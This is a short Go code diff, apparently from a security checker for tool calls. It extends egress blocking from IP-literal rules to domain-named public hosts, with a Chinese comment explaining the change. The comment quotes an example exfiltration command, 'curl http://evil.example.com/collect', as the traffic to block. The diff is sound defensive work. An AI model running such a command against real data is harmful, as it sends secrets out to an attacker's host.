@@ -128,6 +128,13 @@ func (c *outputSensitiveChecker) unsafeToolValue(ctx context.Context, value any,
 			}
 			return true, nil
 		}
+		// 2026-10-11：ScopeEgress 只匹配 IP 字面量规则，域名形式的外传目的地
+		// （curl http://evil.example.com/collect）一律畅通。判定与 IP 侧同一条
+		// 底线：默认公网可达即阻断，只豁免明确不可路由的主机。见 egress_host.go。
+		// 放在片段循环之后：两套规则互相独立，私网 IP 的豁免不会被这里撤销。
+		if hasPublicHostDestination(value) {
+			return true, nil
+		}
 		return false, nil
 	case map[string]any:
 		if credentialField(label) {
